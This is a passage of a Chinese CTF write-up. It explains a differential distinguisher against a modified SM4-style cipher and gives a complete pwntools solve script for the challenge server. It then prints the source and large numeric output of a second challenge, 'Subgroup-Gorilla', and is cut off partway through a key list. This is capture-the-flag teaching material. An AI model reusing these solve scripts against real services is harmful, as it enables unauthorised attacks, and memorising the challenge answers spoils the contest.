这个集合只有最多 256 个可能值（相对于 $2^{32}$ 的全空间，概率约为 $2^{-24}$）

**攻击脚本流程**

+ **预计算特征集 (**`**get_possible_diffs**`**)**：

计算当输入差分为 `0x80` 时，经过一层 S-box 和 L 变换后所有可能的输出差分。这是我们的“指纹库”。

+ **构造 Payload**：
+ 发送 129 个块。
+ `Block[0]` 为全 0。
+ `Block[128]` 与 `Block[0]` 的差分为 `0x80 0x80 0x80 00`（即 $\alpha, \alpha, \alpha, 0$）。
+ 利用 Key Cycle 特性，确保这两个块用同一套密钥加密。
+ **区分器判决**：
+ 提取服务器返回的 `C1` (Block 0) 和 `C2` (Block 128)。
+ 计算异或 `xor_val = C1 ^ C2`。
+ 取最后 32 位 `y3_diff`（即 $\Delta X_7$）。
+ **Check**：如果 `y3_diff` 在预计算的指纹库中，则是 **Real**；否则是 **Random**

exp

```text
from pwn import *

# ================= 配置区 =================
context.log_level = 'info'
HOST = 'nc1.ctfplus.cn'
PORT = 45199

# ================= 算法核心参数 =================
# 题目给出的 S-box
SBOX = [
    147, 138, 104,  87,   5, 201, 249, 141, 243,  72,  71, 221,  97, 174,  48, 155,
    114, 225, 117, 105, 224,  70,   7, 108, 190, 146, 145, 130,  46, 209, 229, 226,
     15, 112, 103,  27,  91, 181, 253, 183, 152, 165, 110,  44, 160,  66, 116,   0,
     75,  26,  61,  96, 127, 157, 197, 164, 172,  20,  37,  68, 202, 101,   9,   3,
    109,  31, 208,  98,  11, 144,  79,  25, 239, 231,  43,  36,  10,   2, 170, 251,
    161, 135, 134, 166, 136, 177, 215,  82, 244, 218,  47, 137, 242,  76, 233, 115,
    182, 153, 214,  84,  13, 159,  60,  74,  65,  54, 163,  56, 180,  30, 139, 236,
     67,  64,  80, 119,  40, 206, 148,  93, 217,  81, 126, 162, 185, 186,  77, 234,
     45, 142, 230, 179,  34, 193, 124, 107, 125, 198,  90,  23,  12, 232, 100,  16,
    120,  59,   1,   6, 102,  24, 133, 176, 150, 187,  28,  51, 195,  85, 196, 219,
    167, 227,  38,  55, 248, 241, 204, 235, 192, 194,  52, 252, 247,   4, 212,  58,
     78, 245, 240,  21,  14,  29, 169,   8, 121,  86, 118, 184, 143, 129,  69, 205,
    132, 213, 246, 238,  73,  53, 122,  62,  35, 210, 250, 149,  17, 203, 111,  18,
    158,  33, 151,  50,  83,  57,  92, 123,  95,  63, 216, 189, 173, 175, 220,  94,
    106,  41, 222, 154,  89, 156, 171,  32, 200,  88, 254,  99, 140, 228, 188, 207,
     19, 113, 255,  49, 237, 223, 191, 168,  42, 211,  22, 199, 128,  39, 178, 131
]

def rotl(x, n): 
    return ((x << n) & 0xFFFFFFFF) | (x >> (32 - n))

def L(b): 
    return b ^ rotl(b, 2) ^ rotl(b, 10) ^ rotl(b, 18) ^ rotl(b, 24)

def get_possible_diffs(d_byte):
    """
    预计算：计算单字节输入差分 d_byte 在经过一层 T 函数（Sbox + L）后，
    所有可能的输出差分集合。
    """
    possible = set()
    for x in range(256):
        y = x ^ d_byte
        s_diff = SBOX[x] ^ SBOX[y]
        # 因为差分加在最低字节，直接作为32位整数传入L即可模拟最低字节差分的影响
        t_diff = L(s_diff)
        possible.add(t_diff)
    return possible

# ================= 攻击逻辑 =================

def solve():
    # 1. 预计算特征集
    # 攻击路径: (Alpha, Alpha, Alpha, 0) -> R1~R3 线性抵消 -> R4 Sbox 激活
    # Alpha = 0x80 (置于每个 Word 的最低字节)
    DIFF_VAL_BYTE = 0x80
    POSSIBLE_SET = get_possible_diffs(DIFF_VAL_BYTE)
    log.info(f"特征集预计算完毕，集合大小: {len(POSSIBLE_SET)}")

    # 2. 构造 Payload (一次性构造，全轮次通用)
    # 利用 Key Cycle = 128。Block 0 和 Block 128 使用完全相同的 Key。
    
    # 构造输入差分: 0x00000080 00000080 00000080 00000000
    d_word = b'\x00\x00\x00\x80'
    null_word = b'\x00\x00\x00\x00'
    full_diff = int.from_bytes(d_word * 3 + null_word, 'big')

    blocks = []
    # Block 0: 全 0
    p1_int = 0
    blocks.append(p1_int.to_bytes(16, 'big'))
    
    # Block 1 ~ 127: 填充块 (使用索引 i 填充，保证唯一性)
    for i in range(1, 128):
        blocks.append(i.to_bytes(16, 'big'))
        
    # Block 128: P2 = P1 ^ Diff
    p2_int = p1_int ^ full_diff
    blocks.append(p2_int.to_bytes(16, 'big'))
    
    payload_hex = b''.join(blocks).hex().encode()
    log.info(f"Payload 构造完成，共发送 {len(blocks)} 个块")

    # 3. 连接靶场
    io = remote(HOST, PORT)
    prog = log.progress("Attack Progress")

    try:
        for r in range(128):
            io.sendlineafter(b'msg > ', payload_hex)
            
            # 接收 Hint
            io.recvuntil(b'hint: ')
            line = io.recvline().strip().decode()
            # 清洗数据：去除列表符号等 ['...']
            hex_data = line.replace("'", "").replace("[", "").replace("]", "").replace(",", "")
            
            # 提取 C1 (Block 0) 和 C2 (Block 128)
            # 每个块 16 字节 = 32 hex 字符
            # Block 0 偏移: 0
            # Block 128 偏移: 128 * 32
            c1_hex = hex_data[0:32]
            c2_offset = 128 * 32
            c2_hex = hex_data[c2_offset : c2_offset+32]
            
            c1_val = int(c1_hex, 16)
            c2_val = int(c2_hex, 16)
            
            # 计算输出差分
            xor_val = c1_val ^ c2_val
            
            # 提取最后 32 bit (对应 R4 的输出状态 X_7)
            # SM4 逆序输出: (X10, X9, X8, X7)。最后4字节即为 X7。
            y3_diff = xor_val & 0xFFFFFFFF
            
            # 判定逻辑
            if y3_diff in POSSIBLE_SET:
                guess = 0 # Real
                status = "Real"
            else:
                guess = 1 # Random
                status = "Random"
            
            prog.status(f"Round {r+1}/128 -> {status}")
            
            io.sendlineafter(b'give me coin > ', str(guess).encode())
            
            # 检查每轮结果（可选）
            # res = io.recvline() 
            
        prog.success("Completed 128 Rounds")
        
        # 接收 Flag
        res = io.recvall(timeout=2).decode()
        if 'flag' in res or '{' in res:
            log.success(f"Flag acquired:\n{res.strip()}")
        else:
            log.info(f"Output:\n{res}")

    except Exception as e:
        log.error(f"Error: {e}")
    finally:
        io.close()

if __name__ == '__main__':
    solve()
```

![](/images/wp/unictf-wp/image-029.png)





### Subgroup-Gorilla
```text
from sage.all import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from hashlib import md5
from secret import flag

class algebraring(UniqueRepresentation, Parent):
    def __init__(self):
        Parent.__init__(self, category=CommutativeRings())
    
    def _element_constructor_(self, x:tuple, n:int=None):
        if isinstance(x, algebra): return x
        if x == 0: return self.zero()
        if x == 1: return self.one()
        if isinstance(x, tuple) and n is not None: return algebra(self, x, n)
        
    def __repr__(self): return "algebraring"
    
    def zero(self): return self(("-∞",), 0)
    
    def one(self): return self((0, 0, 0), 1)
    
    def random_element(self, lower_bound:int =-10, upper_bound:int =10):
        from random import randint

        a1 = randint(lower_bound, upper_bound)
        a2 = randint(lower_bound, upper_bound)
        a3 = randint(lower_bound, upper_bound)
        return self((a1, a2, a3), [0, 1][randint(0, 1)])
    
class algebra(CommutativeRingElement):
    def __init__(self, parent: 'algebraring', t:tuple, n:int):
        CommutativeRingElement.__init__(self, parent)
        self.t = t
        self.n = n
    
    def __repr__(self):
        return f"T{self.t, self.n}"
    
    def is_zero(self):
        return self.t == ("-∞",)
    
    def f(self):
        if self.is_zero():
            return self.parent().zero()
        elif self.n == 0:
            return self
        else:
            p, q, r = self.t
            return algebra(self.parent(), (p + q + r, p - q + r, p + q - r), 0)
        
    def __eq__ (self, other: 'algebra'): return self.t == other.t and self.n == other.n
    
    def __ne__(self, other: 'algebra'): return not self.__eq__(other)
    
    def __lt__(self, other: 'algebra'):
        if self.is_zero(): return not other.is_zero()
        elif other.is_zero(): return False
        elif self.n != other.n: return self.f() < other.f()
        elif self.n == other.n and self.t < other.t: return True
        else: return False
    
    def __le__(self, other: 'algebra'): return self.__lt__(other) or self.__eq__(other)
    
    def __gt__(self, other: 'algebra'): return not self.__le__(other)
    
    def __ge__(self, other: 'algebra'): return not self.__lt__(other)

    def __add__(self, other: 'algebra'): return [self.f(), self, other][(self.f() > other.f()) - (self.f() < other.f())]
    
    def __mul__(self, other: 'algebra'):
        if self.is_zero() or other.is_zero(): return self.parent().zero()
        if self.n == other.n: return algebra(self.parent(), tuple(i + j for i, j in zip(self.t, other.t)), self.n)
        elif self.n == 0 and other.n == 1: return algebra(self.parent(), tuple(i + j for i, j in zip(self.t, other.f().t)), 0)
        elif self.n == 1 and other.n == 0: return algebra(self.parent(), tuple(i + j for i, j in zip(self.f().t, other.t)), 0)

    def _mul_(self, other: 'algebra'): return self.__mul__(other)

gen_matrix = lambda row: matrix(T, (l := len(row)), l, lambda i, j: row[(j - i) % l])

def Multi_Party_protocol(N, T, bits):
    P = random_matrix(T, N, lower_bound=0, upper_bound=2**bits)

    C1 = gen_matrix([T.random_element(lower_bound=0, upper_bound=2**bits) for _ in range(N)])
    C2 = gen_matrix([T.random_element(lower_bound=0, upper_bound=2**bits) for _ in range(N)])

    C3 = gen_matrix([T.random_element(lower_bound=0, upper_bound=2**bits) for _ in range(N)])
    C4 = gen_matrix([T.random_element(lower_bound=0, upper_bound=2**bits) for _ in range(N)])

    C5 = gen_matrix([T.random_element(lower_bound=0, upper_bound=2**bits) for _ in range(N)])
    C6 = gen_matrix([T.random_element(lower_bound=0, upper_bound=2**bits) for _ in range(N)])

    K1 = C1 * P * C2

    K2 = C3 * P * C4

    K3 = C5 * P * C6

    K4 = C1 * K3 * C2

    K5 = C3 * K1 * C4

    K6 = C5 * K2 * C6

    KA = C1 * K6 * C2
    KB = C3 * K4 * C4
    KC = C5 * K5 * C6

    assert KA == KB == KC
    return P, K1, K6, KA

if __name__ == '__main__':
    N = 5
    T = algebraring()
    bits = 512

    P, K1, K6, KA = Multi_Party_protocol(N, T, bits)

    print(f'P = {P.list()}')
    print(f'K1 = {K1.list()}')
    print(f'K6 = {K6.list()}')
    print(f'enc = {AES.new(key=md5(str(KA).encode()).digest(), mode=AES.MODE_CTR, nonce=b'gorilla').encrypt(pad(flag, 16))}')

    '''
    P = [T((1591170167835098385208554183208891656753036707259126589794887548098903695570497882371281334091453993318604195839448664656967120164616131106025592670418364, 12743830907586320514806234566057045981445537646789611919639502383436302896119404940890659498014125565253484281922514037333755371085535101411367024174421685, 51458161748759940858758102765093003840194265774621096502534204803573922549418358868840366174288672189158769341473132353554303295218704195911339671008633), 1), T((12952073599273957326090501127503684508918330173874422356591065169179543765179618052045434701238486072339462495541753432482689302700095575881980545490839548, 12519299904910722124432887002180646922573744327637760744222076592031210232264877106015440902151201665317307166935238935029988794518902121754895536265314327, 1135117202929275728774586523899377675912408494268198726442352334903485837793066464605435455676163203701315551446685682135567368775735326994414850203898869), 0), T((11153627012769591647698553764948764328963534958541109202328144679945177553342122511289713725475435550061138896562710463386045066734390077773554392384347647, 6947056977456459862153399294279851040719241023534081434820787789145948059998618613509743293745247888113677601629000533659902041585031950625492237675736797, 13261819668471683297280354607023610774327030511302307012972005226963980059967960281511605318763783786973465016177297299159787467824732705244178483794204612), 1), T((10096295006833296352677085661422237838113479029626817214147770774840628094466104322506902303584178600349881251687836071302630685872657751249033400241363333, 8295066613878094781372925597101712513309096701023388666031356587691882852949287811224495620899942090964809992141703950509027757250118083660699721391892649, 4166325625264319882401215440189933320438102545809171735695904777504702460131065700029338406786690773147061225686497606378566926072470362495144830379692159), 1), T((9271745611404844818282032973885430969140749026625869774382081967877980936130071422629319901373201788151857352294804686421324106838542575090166788665493464, 13249731797694654609551262422894352777006289011839811979171222484216085133129955868285192724909610488903589585916779139821021436510557343723921985700977150, 12054839156311409137934985589396715330543687847400882731840649923637722487565069698384887177774334872741056163506363101480336053290179152670431965417297894), 1), T((1647562358164114293009163950538084564870715682634211736023589849398493214459532416901613375320317599556610195043045434290012551214673057548162177957583130, 4062279259601447002804185392411795362194167416258596127096861477736254141419883327932343591988962778340998366789092314729884940434856498390133951665327927, 12742966514675093086231333430990135268622440119445924643418808513509524656015463319209188424677485531296552378350923838741641535902973920553986292477119519), 1), T((10248285222908221195948419642812161464039209463111055264001708336485695156551682246672159670589179787988624851196077048434390686419847797087092929719296102, 8734039003646963219433661506738704579362115284246403169979118926385977724828576636341360742143199413349705196499180284974104280518887171567121228379620236, 1448220884513617906594337853300592403221448183371624267979947368693394305548093448149164808823221523108007726591827891602596170186627706853991925392320041), 0), T((12542999283536778664881751120354803954080829427009272061278501975549131985041024838733734959189598018740253490481274276627898187443564000933681450328569812, 7472603559017401628723060315793385089890554651581157227347738846858615575145212110721367253759149719424776043711375062919603705614518086150256067243369794, 4258553147339672066489792013693922947013804566737139071709223860377544973862032148317668322272211814198191460286310043549159667594355932286018465829113291), 1), T((1754011646390004103361606325501278058176988874073542037811752620654425436051692215666755500225351249718200513942315298676255515763091748066267075301124314, 9581411989280950847224954516988128065313783833908405679946862724561400242491669231015212394715246728930188103944912604056270860250858991805732022254915227, 4710531078429925334093876264750442126347886070924905485810925419813303535347987709123712578090765787232828652616735124819382311007908164938929704681809471), 1), T((4422283993198231598163697903787076141792205605017371685172746679051930433151749714712597977118570188741214499310489560463511389031015309507833994564409258, 9016613643461107921244568700600242136357114018418868636347159037967544892816739225095345435191887547813820399371691201531523737613242129001733507594538165, 800669177480107004807528021721558743946370975162639475004761060485427054810071382900211910889614713435113342196105809043900326081424839081549876330486562), 0), T((2275975978516660056759276610042384039679119419044237158077476338929023516154054972558292385618313433788892407970812127353917529883968947005012726432410248, 3480216563203354413974104217034917015817190928636157052816521620202681212800837628442511359934558670847154500834601834028374286551615965102158979263443241, 3709772562401599609198608130960485906632641122143085160938916437798629024161866289853957997902202966363179094650374538181761981578285195639560784228377608), 1), T((10675707638145768001184192206367576276962397570531160539860079845618987698881454744513305616184990910266502071477377872261651172645628864946805897431433355, 12748811179911908180966871761265021449718259548734915032179528941385999313545413582620973746508640456801876499187311014035131581680542041506271467567429057, 6793523902980406515700495335701729075598693733994260905962646380965621112739176947466505306831944520051300129620176788264082784191289273894510694553152173), 1), T((5433812021579043518565634315126779809454210849280203559228948427686984766267988109296578269755694335502853637394977324917217350254434164587737446177420319, 5991330630957194486694961760164889404768318915095518328978010298949084993716921721203771177481936698378168562251148003392249638707492169904715604858727471, 6136224067292238425548061387754393526736092518622960584898344584376535787258794697043419929608537755927091744135070107446863234987526588806224236773620084), 0), T((5989380071390136235129525228778609526605659321957409361784210400536910508063962176048474349574397245438005498200618089067003887451392965772545556125117914, 2301537632503326280698565859112205836999136536548823031040068163037558246219774621558023202028328393735341290997146919909285519318597680959282304740294943, 13400938125553395569902061990005781557688335995578607729795721118221900680520504626211314167285609665395613271494208787849962397649089195287435407097256167), 0), T((6181277947808531537448481619996099898283625367453892640650416078716652901636484912054243265274542317968005159440801668576385271856660946012700687050337451, 7229159936533533708982633552880115260682327492368445812380924627575121733840633307025159243697413077894435504665256281781713736274110669506930534251385376, 58193292865917645121189834993291803676089577816463211717331331482769932191044311697181158269502381757329538575059923865537710657355448733766924393643160), 0), T((9095365660515452310731674232131209164998613384803890834659314043392386891106088240639412183067138553210441336975039880514939116078363638282870472710716528, 9399154963383445504724764169238943039856744268162557010224478552031129900945072792654206213791008418128561000845525619595659916467734938337439302717727154, 4269169336010484512372374787997867873931709527638307059366170984316925101805461686407093652077078611621356794529598249058196089030594906630844356615295823), 1), T((10773303460794734821112124695483016612530993752986047793044288593644149493243784354627476388126854217703824022899962946200925471680355631515694919271512285, 10320769503075604000899388529746067932966975959036716518376883587322855874969851408070227594107861151727511845024138712740632822094323173299252938428118906, 765658014561812827832998780842847047111673308494292185091701631053404294368511997239943891573846308441658122030375557786562306555301996868214260913653065), 0), T((11307161651797882656285099498207033186208306288571907340963830738424438391210474767164991020079609833935673889418427118151864828882853162347426545529898344, 6794113666086050065197108808852689992389057601183939821504455838478872556053363456531230639785698651222756686732646974044481527641894773494209565007457367, 5243324254403756935647491013591954579413823678516238125150258914320897924964906000120904734700195252629938914659940704169981259189327394173961197275060611), 1), T((12146330197302928076604676686789953670259025838404150529755753688698982219037379794767567452882638041029930173864702030692839304131935822784824325001730793, 562674248999457532152957429291599092628479949725581215617583943431724745842802453104003232228861013134451390345706069237452705467610859056682742401532081, 2699119996429239552370008353084251527040478232230418961656845267424618724519719952883798856178899067767285818490022473185847073023772791850261312864546407), 0), T((7962891576054275707660495255690920642853116640085319193123803259748663105326086695447015997920729789687532174687554785761267458504614424659469658312838137, 7111826943420114371722492762601544286845004165824155662177917526070571901452179069858893995139453022113596353301359627629798097377073270872999191216382353, 7152360528967992385747226477022805506877836367550187447630879774494732360695911060192540067167130874897147175361815742656557417364884497242553720186166304), 1), T((3053396354464041927604187876206111912268116917047774533999549090223138634408147049834552884981459845110816402963637439516522188518343904288978915869885036, 2650446642716022623181005347037642449984211937987276795581198067948255161234862358498325295056003396320426018385220711142591252691009656149121081957312771, 5914523752529619202926528599407209829524603415204778541077856965529464363766847280025444397595845314748772632640634846760684696633083625097526547830517479), 0), T((12478325073406214947344792875215371794564965458136248063878877706391376234378165796401979345695404726718303410503736520093557215917375082086595734110641415, 12133298013906111313359355436934781145444469873196810122853264759154098339655076899258132602580819879145048896170528644732552307338726613370556070278949032, 9734953031031375521655336996214642108137666700229356969153431890132248095959675032837616331333929630279772564249823830192725858252971589748538416248588382), 0), T((12611885016956690799671334204921087737604989863199889251005888550182560346048369232696494441522313698596325041800043608664960133718467989118221092182103686, 11177751974690672544952632998515427747962376466736733768540675657705660528245401849189817904995258838622469336618808355495708968101593091027063533875053071, 2943036208093164744550992524026062329446767958408322109915776565870890009968411440377472333458109499490436465077679711770868006665304879940351932934613737), 0), T((7889194590818593400887371551729941228310215112351013427470722340129652715868404806555185373103683498372141832128538539326283092301982214369957337025505015, 7505446569608285119192437095943731808911106305320508097260771013113660775411563160701714108148545017358808393411614765389425184664893711067198549167780849, 6787277775267875781101004259371705625668912981944037209740941401879453129969292259382830189639085006501224531549781222659732547037901615065756395315830397), 0), T((50981411577201897155574619113625892489385696751342142393649151970665838400768684607955847802593689717358382858922737127544212125198510077095105834249173, 1069246186316243825837543552050584086170815396031212924871873533762858055543534102603407121131257261605193029566502794008356729184955578734310912956040480, 9145604126907117270046954921935917248747335879040640541152511331627372723362738554042811208107920592996975873550605177974491976018801790770517041160699707), 0)]
    K1 = [T((18905487988992582769230408631594757999735527984521479342086070085625545523891204819588598797449150953341161725820548139740778749287344686387114927425475803, 20485668511851639335044775753160154185338225079931575751611822655698089401869521417309068077663566270509609077580409689427652367535334135417909237915518944, 26046571235920344859417874709130808948032244593390346528557283574577956781343723893386527973328428991072824504762327893291466493781265916096514080767159049), 1), T((18080938593564131234835355944057951130762797981520531902320381278662898365555171919711016395238174141143137826427516754859472170253229510228248315849605934, 25440333695668199163223112578952794449035417390747999064751688552222291682050189474369765181673234668448388671355484878739646046795773395481131502224603445, 33935084766967434114951644858337590958137829894982057524702028720710976808777727891742076744316073090666819442582193388393235620998974706271801215804764784), 1), T((27518417937258046888333438942085300222355256941966151743632873450466483839881852903936464576296997758025815023493238002685220813006208147952799229818955815, 9696127467509037140322558769236074879663310864406661536803090855708970283228070339459935972774456809377880925508429326005043259411617012895459062072743528, 24506280960213689505522412210093842347082125771762789492187342710538646621653091329213044466972130712955151544001423179630723205033594099199319800239517654), 1), T((20707069660806329956992247593017290658210358526175810645222395182173329451328007063708111918387362387332339516081171661398998254124861058430781576815937844, 28465994913045814502481241773763527495243765455790668617174795432402694205337086269315054905115410432923585606973434039020464813206102565069228259106148859, 22866392635496185279219796178324315699197384362649325720059084937165133042452849953136390529520469957996342851809982818337263718407905442972744456489533863), 1), T((19962819994928878064251876735121284490585583913435771330266443990730094982767223008371410219340407903052419370695422531824193130149077012911635919568460117, 19137658875430004415825249450338292712748369402442268520401253857152154608918852219594315750508872067658476687067706272578526651870248002382701754199363092, 35142065279127708274297013875964486401921172558883481805833384024037234381180618474868794885305522004899228295253127586072687035533528258845547734181671502), 1), T((10563204628549290519914929295673798219799037828968204165750051931439342865476792712748451994090323602709480988075027367114403579177778683204348602485236784, 21772013887254495400896804673046569737342912212816592765527328792567606791411902837099784851478870908474987189383618342974895470536075043562941538778541522, 26590776689085950311110535533691317753942028118506080278672304216886557856560645902480902144632504005158591931692565411732281878716703718540298955069276361), 1), T((64729180628535560930226087390693794290979535119192028207096542967502880289385405900356653414026296774931007541441258990953662923386154065275869167151811495, 24046710295235740274762214439780965082042407720816484925233060275386181553956528900434246444445895070005622419147859834464394892888568882778791514789922463, 25970556417421594552663011251545055862068216367396360628754984031501552543338344494485936380564386534598365053188456709246371456575849979855248573388766765), 0), T((19126727683176014266539729618780923546246574340448540940021629379946728643552640559834218485269510030276278781578833669652286197557595831766846152095221017, 25116338696517351826239134181737449085382250175218310595219745043047824792736745479348287372397778394250270108631648644580993147993295461900396094256446956, 20342038068526263275891675630620454497530400156293371873462609540516437031519134692076978874765604049566399516719404279131377023247211075709078118551677513), 1), T((62083892414869170406820021115459357158035370727531052470287317403999299415279792082320467109241173211377475895230384653410813118655510409562170030287300739, 22977532454442020488902179240742447651063481452819756859719007972679686261015242314137578042903953480165049104316359438774159680945744765663041632855363060, 32832474929762794133809110114491021572829364611964317982034224893114097434742521938152446470924308552342100102902308259792368421400413921294581597218214118), 0), T((21352192265696065081435074090527324115702878381903934189216801286334049414466125335815431453054570371731533964613986345066046250858250936071762977512682282, 19663205456990946182394910471851826761919683030489344312928204914864822124065445716805939710522773898969575129150080801838228315899734137907465583766996089, 26138798757995697043506451282634798574607946614318313864570602657450799295074690341674857888813950032123954739362140330462059235303151485887387716216580181), 1), T((15958936057686764748219058634513646986735108391572856015484886546570027786140763116328842796952952369306317158173356867550695697866250789343869652761680120, 19981282474005227286892802845836725805288620723947838163077263756232331576053934305082397785634008934182931780144119838376155021841310029678710059897447493, 20699506074416710108623947225393855324598405407491498596908283940609390829541841588472684680131589938176403054220383620324954207704062323929807255995865548), 1), T((66090229085622834284111516369608119407668894205157523058219973261980273809823275774527975483163294358411158223267860363456294730349908167844454010171485384, 19301826708130622408964018945999329273640857787744171352870191979734312416598700240767211175619701861847587819352835061576083970636033562717197022376106772, 18224288580635339495955877204637486039578753953925970759975292205281674095579400769863945144313537548241606887274299257444729118830132656729766428590392834), 0), T((54721758213951524646457992903112634177957861365226574872668261806152931282773969936381379939436097261922871418821598851202050266715394326293873660904933728, 28227491356319184576365815179901704618063532156691738220560084517973063502687208216658352942672818704937769037318200976757519607139732797583824138041802406, 20392319501168856281247100707695347583415354032137454702799688880865849312481913842535874925572585800816939621150125758306492980436845457620335532018458129), 0), T((19484900620305054417737515176540096438584446525425822667798379156403905128306555241595002110049963263257782545610089940699799236060315800084887424615545825, 24939413077885452734638721917323463121747387927643102117759995009392205862465647188705546203272264636346675584626016752953756191965758093263480984091055352, 28673769513636431492717154604642604703192835781575435698824025178038875433951835140823694873373682737977063408696007075176982351900084827495879944940619063), 1), T((62876416178909660525475543049683846474987974812668456222946956582303590926306880191539638017090614433762936635918921731939347709854783830003158384242005932, 28693363441893838145123771883304059813534034371866565606298044690197903679344979167329772571875747138779190200579453642381375739991960011072760892497108026, 12596514649601617418629165849459422219331149233634055362439564918952476067257224020622171396261959795128567594583492230568879269265901213740977765907099946), 0), T((20127657029493858308485141048071952219361439985271467319510086111394969846912656641701708605786550077415718696291629860439977767351889944733009079625867822, 24012250347012001102887295609600218558834602608079142251026623078708577744740960497918576779506712067086519099927826975494360988775678607223656512930612451, 20239194357780098645920516282812519944036793174464236549792343333704214389844738705699223629475216211092103947876303636451747860289086531573378592316073849), 1), T((19303107634065406774090088360535145350388709982270519879744397304432322688576623741824126203575573265217694796898598475558671188317774768574142468049997953, 28966915530828560931065632435392858822531794918895565564166488975232780024921628554979273883516380465025298693702902164806354668036117867286878777239696952, 28127707888827187901454286432019301954142378476055947545937088479837234417278742704054772400462860310686098885696169131553516987506795321748665727353679584), 1), T((17904558642674738727284997202303729326620662339698552962597613354177304320531188737721108676932110906201721811107751948953087179493050573420951999894828998, 21589756861356990058396614325297384711885872647070744095804944620037336449865306398738778670554632597673360086284231358514284526752950990094648819241353449, 26149414946666509489389034056938743501525851575219481852227549781390179423018119879764283218618816829547120073605428535971095656739390460232213607002762713), 1), T((60370906784162735062309365707851622016568160086585800199704843759741699857726354185658038279494725512254183140008177737791846865264335174138936486920057572, 20690277686428407264014274080197455462207091614420050811824748153285172761466561757064069266716263871532224191173714832874358544426780596077159870825264726, 32134913079710773929215270076092856097546829561603376273119291909084574861331078281624084987917595977301052719527748082517061936651810846270158434885304284), 0), T((21184989035430153603506609151598478710211495914185759307690460016499519305788674830484520027677807027126976341166504252523392148213622271257530071768852136, 22664240710590366183667769306778357086244746930589835019816054280162642951790291300203824452352017864235386709415123558645235273110592474188449029214456599, 29334688400987462060799655449646197397925721139957371827068443783163491989681633287181490541452309224918507738367103329232968402041348874322412245730586302), 1), T((11785373669050566059169661712150992439424949829718192143174067957208767188498244534861561802427722726784037958546109087813602597242323941550242754685628803, 25298595722414857168739324529486634110839289740964159264942129215578095134283341917709293553322016705051897211731035629041604091776419515368688813793635029, 20783399810945704097613177107373028749946576699579970299907363976012815465061660714793597800779291225177871374806541154892563245224524334017163466618191161), 1), T((66442166259241996274736742798301529432446745760137280477679016611760479846938843797019082243772744474054300296663465906572629176777329300699102710519054662, 26333965063249353499650119600325957270898797559216190973127320094780695053505209457507755220633584678638447332290504440364196029407533052364673276820020797, 26668118267473614757256851289943221337350751417757302337669917015531075116749788151014297863571099109639412436563016886521677941324453054879671735721676599), 0), T((11678924380824676248817219337187798946118676638278861841385905185952834966906084736096419677522689076622447639646839223427359632693905251032137857342087619, 19779462992735353324318555404910301407719673323314349712092127968752949033211556014626424750595732754462707474575215339715218171960417021953090743204047729, 28815835247190871849750634273612721892221130748100989457515247069709036585729136324879073647366010969241595100540729868814822470119590089632220054413501209), 1), T((61731955241250008416194794686765947133257519172551295050828274054219093378164224059829360348631723095734333821834779110294478672228089276707521329939731461, 15945394099323289398216078586415819653805541681347737239461879857633303624108733097397033997890070663374189591378690059986047622174245276015565378411449035, 24388645242924518872508136029185286275057367148132986404339600082864696413572134557002093751666746990944294553613590630715419598906093523144676290086930353), 0), T((22574361306197340620689806507004518335328790382653922166640817312103473737487577157928541261391969495806090935085068065765245268922796194417657129713074301, 23189787292151307950237430328291891135416060558636910812343005337875310466936884797415448412365919695546485151497498087904936937140078609713212858782089596, 20331421879855450830009092856316509570612495195392203885805662416577056903575705153987553544960737252143234182476116073622340601810972101364252227765494981), 1)]
    K6 = [T((42683775142575872306551476826744333222170071649667750879831785847277593280285072710172291017549620864389004474270701751928637370804063823508351269299098296, 43296908387848588591018809874408547980014618217536893883848607041617707034519825356163981819355811076244743599123639964153023890925235119278580159393890550, 23401035349175664399552591321505098502109015644279628401529153159823217036322425750848023131974533318455275511380828968903177062563043777398804477031914188), 1), T((50810769288396627981742435470245121757293588723441897764701077787999807073273286893049035886800221027338940519717918819173665596176619674576624871775029509, 30483395480656314449881931803600763512935366586974760190062904883607983443403220413590278565101966947449609226259547190030456601349840445904836232617956350, 29577305536138152426213026065487556630090406969494821760489480321175351428094323063493400154392100918893390358079785671357989990727257450976665912677456488), 1), T((40564942131981283378861977832054506347601271230438954215870812695527384356217631955474950080953145536009850539779572627997701642725464413189571265126693993, 34518708008733208288726571789789512864800085854677070141203792269318395270050581197335750109238900300801906356380099331716865394904031399121200473511645617, 33662612895117243786869276588269972774509518959373520517412250924999628602655724038040334168813073176973859074166331759664243247074749196204040303054625844), 1), T((40663822812647921368044801522480664417130899445603860024713097504105551402930863065401798772783011712897152610518360770686177279000912319961221625557182231, 47155751722029631171088710387236857747200988668139763403361271288273954503958007261791048002906494883027758037590648011542520761644646449938811914851098195, 22082871465993833377283687883708867755168569703701292684908486405352947890079455936007987172293479065466087129112099177131547307500139454342671705077862658), 1), T((51460379057353947750734565001871225736811384974814014541125724821678023126799124377307071664822425955193493835217801470335587278954355356575090537497680675, 37929032308149162914645446713171102592496473089999631241454669638440756703775909980124773771009087241885684033302382079906584160083692986881322589089687484, 25178199527781822767127735170973760452900883406664734945702666271867648920502292867148814066407799459875498156101717964471761378766131207936072476406619616), 1), T((48943477643005617318044876556257894080175156866963786243282655658069662787113716798828606543795613918865189100714022414807418581378684538589749318877893052, 35759603101550821002125743249072399872763071484128517994894694978135367181803421885489885057851457684826709681735483141145984477415864401260851632942015613, 32112276291778886875423729387495362758675296136751943594742902841763427566971467862642237138951833624746499027413652416072913107324190792585158141401495370), 1), T((115524591566746486380156152581905353053865877669699281490119857548495031150369484763341475751369799750664070578266951233829184864326862928970636518887537567, 28899939418000076720137484186817420193009600880342817465198103981360507338765094729566900881701538117277662544548387738856857980802407774387178059601324500, 55134303507770546105847653404050507310751945416986071973184774071212225166440184043040218237866206310474420443848072784418826147951235602214151511631376896), 0), T((38796531167256910704347242608493436740012467589125748503294675374175407116771292971181369429778404604423401191514464366319930264202977183974346072660045774, 52431959342924137723332521832708494107028693565293521208193061382801338242358208733690654495655985620404858493066583962658048637710670405294827315175157458, 24617842221634567826494391205716673883753458870958414519161908925941024028956600735156824156853211771319195798445965921846470424097072795951163933801901540), 1), T((49593087411962937087037006087883998059692953118335903019707302691747878840639554283086642321817818846719742416213905065969340264156420220588214984600544218, 43205239929043669466889258158642738952324177987153389046286459732968140442176111452024380263758577979262784488778318031022112036149716942237337989413746747, 27713170283422557216338438492981566581485772573921856779956088792455725059379437666297651050967532165728606825435584709186684495363064549544564705130658498), 1), T((40816483497184861642853917912757105545051639793189639358413363717347448994125502615951861674545013755915253055266805347562390356006128687521475716401961839, 48573116008743095143262621319880184339842323114690651688680397136145090772920026828063588312105301813621844054599575915268551766991259074634595559717949813, 